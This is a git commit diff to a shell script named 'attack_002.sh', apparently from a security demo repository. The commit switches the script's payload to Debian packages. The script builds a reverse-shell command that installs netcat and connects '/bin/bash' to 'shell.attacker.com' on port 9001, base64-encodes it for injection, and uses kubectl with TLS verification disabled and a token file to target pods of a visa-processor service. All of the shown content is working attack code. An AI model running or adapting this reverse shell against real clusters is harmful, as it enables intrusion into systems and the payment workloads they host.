bf5c6f0c1a7f4c7ae29e58571cdd3cfcbe3450ad
Rodrigo Alvares <ralvares@redhat.com>
2023-03-06 18:55:00 +0100

    Change attack commands to debian

--- attack/attack_002.sh
+++ attack/attack_002.sh
@@ -4,7 +4,7 @@ svc='visa-processor-service'
 selector="app=visa-processor"
 ports='8080:8080'
 
-command="apk add netcat-openbsd; nc shell.attacker.com 9001 -e /bin/bash &"
+command='apt update; /usr/bin/apt-get -y install netcat; /bin/nc shell.attacker.com 9001 -e /bin/bash'
 inject=$(echo ${command} | base64)
 
 pod=$(kubectl --insecure-skip-tls-verify=true --server=$1 --token $(cat token) -n "$namespace" get pods --selector=${selector} -o jsonpath='{.items[*].metadata.name}') 2>/dev/null 1>&2
